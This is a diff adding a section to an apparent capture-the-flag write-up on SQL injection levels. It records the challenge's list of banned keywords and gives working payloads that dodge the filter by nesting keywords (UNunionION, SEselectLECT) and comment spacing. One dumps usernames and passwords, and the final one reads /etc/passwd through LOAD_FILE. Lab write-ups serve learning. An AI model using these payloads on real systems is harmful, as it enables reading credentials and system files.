@@ -182,3 +182,49 @@ Explanation:-------------------------------------------------------------------
 
 Solution:----------------------------------------------------------------------
   UNION SELECT users.username,users.password,3 FROM users;# \
+
+###############################################################################
+Level 7
+##############################################################################
+  Lots of trial and error on this one. We aren't given source code, but we
+  are told that we might open a file. We know:
+
+    1) file is in /etc/passwd --> use LOAD_FILE
+    2) we are doing an SQL challenge --> assume attack is SQL
+    3) we are posting something to /level7.php?id=INT --> INT is SQL injection
+
+  I got a "hacking detected" error from working off these assumptions, so I was
+  on the right track. This took a ton of trial and error but got to a milestone:
+
+    http://34.66.235.224:12000/level7.php?id=(LEAST(1,2)AND(0))
+
+  The query always returned the same thing. This was because AND resulted in 
+  the id=0 string message to be returned. More trial and error lead me to:
+
+    34.66.235.224:12000/level7.php?id=(LEAST(0,0)OorR(1))
+
+  Now we know some of the injection prevention methods they used:
+    1) Banned words are [or,union,select,load_file,where,from]
+    2) Spaces are dissallowed
+    3) String detection of banned words along with trunction
+
+  This lead me eventually to the solution. A couple of important other
+  milestones:
+    1) document.location = document.location.origin + "/level7.php?id=(LEAST(0,
+            0))/**/UNunionION(SEselectLECT/**/1/**/)"
+          INFO: paranthetical separation was acting fully, so I tried to
+                use spaces wherever possible
+    2) document.location = document.location.origin + "/level7.php?id=0/**/
+            UNunionION(SEselectLECT(text)/**/FrfromOM/**/motivation/**/
+            WHwhereERE/**/id=3)"
+          INFO: This still resulted in the same thing over and over needed to
+                find a way to append the result of another query to this one
+                that wasnt union.
+    3) document.location = document.location.origin + "/level7.php?id=0/**/AND
+            /**/id=1/**/UNunionION(SEselectLECT('i can return this text!'))"
+          INFO: BINGO! I can make the first call result no rows and just
+                union with the relevant file.
+
+Solution:----------------------------------------------------------------------
+  document.location = document.location.origin + "/level7.php?id=0/**/AND/**/id
+    =1/**/UNunionION(SEselectLECT/**/LOAD_FIload_fileLE('/etc/passwd'))"
